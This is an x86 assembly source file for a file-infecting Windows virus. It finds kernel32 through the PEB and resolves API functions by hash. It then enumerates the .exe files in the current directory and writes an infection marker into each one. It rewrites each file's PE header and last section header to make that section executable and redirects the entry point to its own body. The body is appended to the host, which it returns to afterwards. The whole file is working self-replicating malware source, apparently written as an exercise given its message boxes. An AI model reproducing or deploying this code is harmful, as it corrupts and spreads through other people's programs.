    .386
    .MODEL Flat, STDCALL
    option casemap:none             ; Treat labels as case-sensitive

.CODE
start:
incode segment
_start:
        call    delta
	delta:
            pop     ebp
            sub     ebp, offset delta
        mov     eax, [ebp + offset base_address]
        mov     [ebp + offset original_base_address], eax
        mov     eax, [ebp + offset entry_point]
        mov     [ebp + offset original_entry_point], eax
                        
        call    find_kernel32 ;output in eax
        mov     ebx, eax
        lea     edx, [ebp + offset hash_GetProcAddress]
        mov     ecx, 0dh
        find_funcs:
            push    [edx] ;push func_hash
            push    ebx ;push pointer kernel32_addr
            call    find_func ;output in eax
            mov     [edx - 04h], eax
            
            add     edx, 08h ;next func
            dec     ecx ;decrease countdown
            cmp     ecx, 00
            jnz     find_funcs ;ecx=0
        call    load_MessageBoxA
        _find_first:
            lea     ebx, [ebp + offset file_data]
            lea     edx, [ebp + offset str_exe]
            push    ebx
            push    edx
            call    [ebp + offset func_FindFirstFileA] ;param LPCSTR file_name, LPWIN32_FIND_DATAA file_data, return HANDLE handle_search in eax
            cmp     eax, -1
            jz      malware_done
            mov     [ebp + offset search_handle], eax
            ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                call view_infor
            ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           
            _find_next:
                lea     ebx, [ebp + offset file_data]
                mov     edx, [ebp + search_handle]
                push    ebx
                push    edx
                call    [ebp + func_FindNextFileA] ;params: HANDLE handle_search, LPWIN32_FIND_DATAA file_data, return true or false
                cmp     eax, 00h
                jz      malware_done
                
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                call view_infor
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           

                jmp      _find_next
            
        load_MessageBoxA:
            lea     eax, [ebp + offset str_User32]
            push    eax
            call    [ebp + offset func_LoadLibrary] ;output in eax
    
            lea     ebx, [ebp + offset hash_MessageBoxA]
            push    [ebx]
            push    eax
            call    find_func ;output in eax
            mov     [ebp + offset func_MessageBoxA], eax
            ret
        show_message:
            push    0
            lea     eax, [ebp + offset str_mess_capt]
            push    eax
            lea     eax, [ebp + offset str_mess_mess]
            push    eax
            push    0
            call    [ebp + offset func_MessageBoxA]
        malware_done:
            mov     eax, [ebp + offset original_entry_point]
            cmp     eax, 00
            je      exit
            add     eax, [ebp + offset original_base_address]
            jmp     eax
            exit:
            push    0
            call    [ebp + offset func_ExitProcess]
            
        
;--------------------------------------------------------------------------------------------------------;        
        ;return kernel32.dll addr in eax
        find_kernel32:       
           ASSUME FS:NOTHING     
           mov eax, fs:[30h] ;PEB
	   mov eax, [eax + 0Ch] ;PEB->Ldr
	   mov eax, [eax + 14h] ;PEB->Ldr.InMemoryOrderModuleList.Flink
	   mov eax, [eax] ;next entry (2nd entry)
	   mov eax, [eax] ;next entry (3rd entry)
	   mov eax, [eax + 10h] ;3rd entry base addr (kernel32.dll)
	   ret;
      
        ;get func_hash and lib_addr in stack and return in eax
        find_func:
            pushad
            mov     ebp, [esp + 24h] ;lib address
            mov     eax, [ebp + 3ch] ;PE_header_offset
            mov     edx, [ebp + eax + 78h] ;get export_dir_RVA
            add     edx, ebp ;export_dir_VA
            mov     ecx, [edx + 18h] ;NumberOfFunctions
            mov     ebx, [edx + 20h] ;AddressOfNames
            add     ebx, ebp ; AddressOfNames_VA
            find_func_loop:
                jecxz   find_func_done  ; if ecx = 0, break
                dec     ecx
                mov     esi, [ebx + ecx * 4]; func_name_RVA
                add     esi, ebp ; func_name_VA
            calc_hash:
                xor     edi, edi
                xor     eax, eax
                cld     ; clear the direction flag
            calc_hash_next:
                mov     al, [esi]
                inc     esi
                test    al, al
                jz      find_func_compare
                ror     edi, 0dh
                add     edi, eax
                jmp     calc_hash_next
            find_func_compare:
                cmp     edi, [esp + 28h] ;compare hash and func_hash
                jnz     find_func_loop ;not match
                mov     ebx, [edx + 24h] ;AddressOfNameOrdinals_RVA
                add     ebx, ebp ;AddressOfNameOrdinals_VA
                mov     cx, [ebx + 2 * ecx] ;func_oridinal
                mov     ebx, [edx + 1ch] ;AddressOfNameOrdinals_RVA
                add     ebx, ebp ; AddressOfNameOrdinals_VA
                mov     eax, [ebx + 4 * ecx] ;func_RVA
                add     eax, ebp ;func_VA
                mov     [esp + 24h], eax ; Overwrite the stack copy of the preserved eax register
            find_func_done:
                mov     eax, [esp+20h]
                mov     [esp+28h], eax
                popad
                pop     eax
                pop     eax
                ret
        view_infor:
            push    0   ; NULL
            push    20h ; FILE_ATTRIBUTE_NORMAL
            push    3h  ; OPEN_EXISTING
            push    0   ; NULL
            push    1h  ; FILE_SHARE_READ
            push    0C0000000h  ; GENERIC_READ | GENERIC_WRITE
            lea     eax, [ebp + file_data + 2ch]
            push    eax ;file_name
            call    [ebp + offset func_CreateFileA] ;params: LPTSTR file_name, DWORD desire_access, DWORD share_mode, LPSECURITY_ATTRIBUTES security, DWORD creation_disposition, DWORD flags_attributes, HANDLE template_file, return file_handle
            cmp     eax, 0FFFFFFFFh
            mov     [ebp + offset file_handle], eax
            je      open_view_fail
            open_view_success:
                push    0
                lea     eax, [ebp + offset str_success] ;str_mess_capt
                push    eax
                lea     eax, [ebp + offset file_data + 2ch]
                push    eax
                push    0
                call    [ebp + offset func_MessageBoxA]
                push    [ebp + offset file_handle]
                call    [ebp + offset func_CloseHandle]
                call    infect_file
                jmp     view_done
            open_view_fail:
                push    0
                lea     eax, [ebp + offset str_fail] ;str_mess_capt
                push    eax
                lea     eax, [ebp + offset file_data + 2ch]
                push    eax
                push    0
                call    [ebp + offset func_MessageBoxA]
            view_done:
                ret
;-------------------------------------------------------------------------------;
;-----------------------------------INFECTION-----------------------------------;
;-------------------------------------------------------------------------------;
        ;get file_data addr in stack
        infect_file:
            pushad
            file_open:                      
                push    0   ; NULL
                push    20h ; FILE_ATTRIBUTE_NORMAL
                push    3h  ; OPEN_EXISTING
                push    0   ; NULL
                push    1h  ; FILE_SHARE_READ
                push    0C0000000h  ; GENERIC_READ | GENERIC_WRITE
                lea     eax, [ebp + offset file_data + 2ch] ;file_full_path
                push    eax
                call    [ebp + offset func_CreateFileA] ;params: LPTSTR file_name, DWORD desire_access, DWORD share_mode, LPSECURITY_ATTRIBUTES security, DWORD creation_disposition, DWORD flags_attributes, HANDLE template_file
                cmp     eax, 0FFFFFFFFh
                je      open_fail
                mov     [ebp + offset file_handle], eax ;save file_handle
                jmp     open_success
            open_fail:
                popad
                mov eax, 0FFFFFFFFh
                ret
            open_success:
                check_pe:
                    ;read magic word
                    push    00h;
                    lea     eax, [ebp + offset bytes_read]
                    push    eax ;bytes_read
                    push    02h ;bytes_to_read
                    mov     [ebp + offset data_dword], 00h ;clear data_dword bits
                    lea     eax, [ebp + offset data_dword]
                    push    eax ;buffer addr
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_ReadFile]
                    
                    ;compare
                    cmp     [ebp + offset data_dword], 5A4Dh
                    jne     close_file
                check_injected:
                    ;seek to mark
                    push    00h ;FILE_BEGIN
                    push    00h ;
                    push    38h ;offset to pe_header offset data
                    push    [ebp + offset file_handle] ;HANDLE
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;read mark
                    push    00h;
                    lea     eax, [ebp + offset bytes_read]
                    push    eax ;bytes_read
                    push    04h ;bytes_to_read
                    lea     eax, [ebp + offset data_dword]
                    push    eax ;buffer addr
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_ReadFile]
                    
                    ;compare
                    cmp     [ebp + offset data_dword], 0h
                    jne     close_file
                read_pe_header:
                    ;seek to pe_header offset data
                    push    00h ;FILE_BEGIN
                    push    00h ;
                    push    3ch ;offset to pe_header offset data
                    push    [ebp + offset file_handle] ;HANDLE
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;read pe header offset
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax ;bytes_read
                    push    04h ;bytes_to_read
                    lea     eax, [ebp + offset pe_header]
                    push    eax ;pe_header addr
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_ReadFile]
                    
                    ;seek to pe_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset pe_header] ;offset to pe_header
                    push    [ebp + offset file_handle] ;HANDLE
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;read pe_header_data
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    0f8h ;pe_header size
                    lea     eax, [ebp + offset pe_header_data]
                    push    eax ;pe_header_data addr
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_ReadFile]
                read_last_section:
                    ;get number of sections
                    mov     ebx, [ebp + offset pe_header_data + 06h] 
                    mov     eax, 00h
                    mov     ax, bx;
                    mov     [ebp + offset number_of_sections], eax
                    
                    ;calc last_section_header offset    
                    mov     eax, 00h ;clear eax register
                    mov     eax, [ebp + offset number_of_sections]
                    dec     eax ;subtract first section
                    mov     edx, 28h ;size of section header
                    mul     edx ;calc size of section headers to ignore
                    add     eax, [ebp + offset pe_header]
                    add     eax, 0f8h ;pe_header_offset + pe_header_size
                    mov     [ebp + offset last_section_header], eax
                    
                    ;seek to last_section_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset last_section_header] ;offset to pe_header
                    push    [ebp + offset file_handle] ;HANDLE
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;read last_section_header_data
                    push    00h
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    28h ;section_header size
                    lea     eax, [ebp + offset last_section_header_data]
                    push    eax ;last_section_header_data addr
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_ReadFile]
                init_data:
                    ;read base_address
                    mov     eax, [ebp + offset pe_header_data + 34h]
                    mov     [ebp + offset base_address], eax
                    ;read entry_point
                    mov     eax, [ebp + offset pe_header_data + 28h]
                    mov     [ebp + offset entry_point], eax
                    
                    ;get section alignment
                    mov     eax, [ebp + offset pe_header_data + 38h]
                    mov     [ebp + offset section_alignment], eax
                    
                    ;calc malware_size
                    mov     eax, offset _end
                    sub     eax, offset _start
                    mov     [ebp + offset malware_size], eax

                    ;append_size = (size + section_alignment -1) / section_alignment * section_alignment                        
                    mov     eax, [ebp + offset malware_size]
                    add     eax, [ebp + offset section_alignment]
                    dec     eax
                    mov     edx, 00h ;clear edx register for division
                    mov     ebx, [ebp + offset section_alignment]
                    div     ebx
                    mul     ebx
                    mov     [ebp + offset append_size], eax
                    
                    ;append_pos = last_section_offset + last_section_size
                    mov     eax, [ebp + offset last_section_header_data + 14h]
                    add     eax, [ebp + offset last_section_header_data + 10h]
                    mov     [ebp + offset append_pos], eax
                modify_pe_header:                  
                    ;entry point = last_section_VA + last_section_raw_size
                    mov     eax, [ebp + offset last_section_header_data + 0ch] ;VA
                    add     eax, [ebp + offset last_section_header_data + 10h] ;raw_size
                    mov     [ebp + offset pe_header_data + 28h], eax ;entry point
                    
                    mov     eax, [ebp + offset append_size]
                    ;increase size of image
                    add     [ebp + offset pe_header_data + 50h], eax
                    ;increase size of code
                    add     [ebp + offset pe_header_data + 1ch], eax
                    ;increase size of initialized data
                    add     [ebp + offset pe_header_data + 20h], eax
                    
                modify_last_section_header:
                    mov     eax, [ebp + offset append_size]
                    ;add flags
                    or      [ebp + offset last_section_header_data + 24h], 80000000h ;IMAGE_SCN_MEM_WRITE
                    or      [ebp + offset last_section_header_data + 24h], 40000000h ;IMAGE_SCN_MEM_READ
                    or      [ebp + offset last_section_header_data + 24h], 20000000h ;IMAGE_SCN_MEM_EXECUTE      
                    or      [ebp + offset last_section_header_data + 24h], 00000020h ;IMAGE_SCN_CNT_CODE      
                    ;increase raw data size
                    add     [ebp + offset last_section_header_data + 10h], eax
                    ;increase virtual size
                    add     [ebp + offset last_section_header_data + 08h], eax
                override_pe_header:
                    ;seek to pe_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset pe_header]
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    0f8h
                    lea     eax, [ebp + offset pe_header_data]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_WriteFile]
                override_last_section_header:
                    ;seek to last_section_header offset
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset last_section_header]
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    28h
                    lea     eax, [ebp + offset last_section_header_data]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_WriteFile]
                mark_injected:
                    ;seek to mark
                    push    00h ;FILE_BEGIN
                    push    00h ;
                    push    38h ;offset to pe_header offset data
                    push    [ebp + offset file_handle] ;HANDLE
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;override mark
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    04h
                    mov     [ebp + offset data_dword], 01h
                    lea     eax, [ebp + offset data_dword]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_WriteFile]   
                inject_malware:
                    ;seek to malware pos
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset append_pos]
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;append
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    [ebp + offset append_size]
                    lea     eax, [ebp + offset _start]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_WriteFile]
                    
                    ;seek to malware pos
                    push    00h ;FILE_BEGIN
                    push    00h
                    push    [ebp + offset append_pos]
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_SetFilePointer]
                    
                    ;override
                    push    00
                    lea     eax, [ebp + offset bytes_read]
                    push    eax
                    push    [ebp + offset malware_size]
                    lea     eax, [ebp + offset _start]
                    push    eax
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_WriteFile]
             
                close_file:
                    push    [ebp + offset file_handle]
                    call    [ebp + offset func_CloseHandle]
            inject_end:
                popad
                mov     eax, 1h
                ret
                       

;-------------------------------------------------------------------------------;
;-------------------------------------DATA--------------------------------------;
;-------------------------------------------------------------------------------;
                
;---------------------------------------------------------------;
;---------------------------FUNCTIONS---------------------------;
;---------------------------------------------------------------;				
        addr_Kernel32 dd 0   
            func_GetProcAddress         dd      ?
            hash_GetProcAddress         dd      7c0dfcaah  
            
            func_LoadLibrary            dd      ?
            hash_LoadLibrary            dd      0ec0e4e8eh
            
            func_ExitProcess            dd      ?
            hash_ExitProcess            dd      73e2d87eh
            
            func_CloseHandle            dd      ?
            hash_CloseHandle            dd      0ffd97fbh
            
            func_CreateFileA            dd      ?
            hash_CreateFileA            dd      7c0017a5h
            
            func_FindClose              dd      ?
            hash_FindClose              dd      23545978h
            
            func_FindFirstFileA         dd      ?
            hash_FindFirstFileA         dd      63d6c065h
            
            func_FindNextFileA          dd      ?
            hash_FindNextFileA          dd      0a5e1ac97h
            
            func_GetCurrentDirectoryA   dd      ?
            hash_GetCurrentDirectoryA   dd      0bfc6eb4fh
            
            func_ReadFile               dd      ?
            hash_ReadFile               dd      10fa6516h
            
            func_SetFilePointer         dd      ?
            hash_SetFilePointer         dd      76da08ach
            
            func_WriteFile              dd      ?
            hash_WriteFile              dd      0e80a791fh
            
            func_lstrcatA               dd      ?
            hash_lstrcatA               dd      0cb73463bh

        str_User32                      db     "user32.dll",0
            func_MessageBoxA            dd      ?
            hash_MessageBoxA            dd      0bc4da2a8h

;---------------------------------------------------------------;
;---------------------------VARIABLES---------------------------;
;---------------------------------------------------------------;				

        str_mess_capt                   db 		"Hello",0
		str_mess_mess                   db 		"!!Infected!!",0       

        str_exe                         db      "*.exe",0
                
        search_handle                   dd      ?
        file_handle                     dd      ?
        file_data                       db      320 dup(?)
		
        bytes_read                      dd      ?
        data_dword                      dd      ?
        
        original_base_address           dd      0
        base_address                    dd      0
        original_entry_point            dd      0
        entry_point                     dd      0
        number_of_sections              dd      ?
        section_alignment               dd      ?
        pe_header                       dd      ?
        pe_header_data                  db      0f8h dup(?)
        last_section_header             dd      ?
        last_section_header_data        db      28h dup(?)
        
        malware_size                    dd      ?
        append_size                     dd      ?
        append_pos                      dd      ?

        str_fail                        db      "Fail",0
        str_success                     db      "Success",0
        
_end:
incode ends
end start
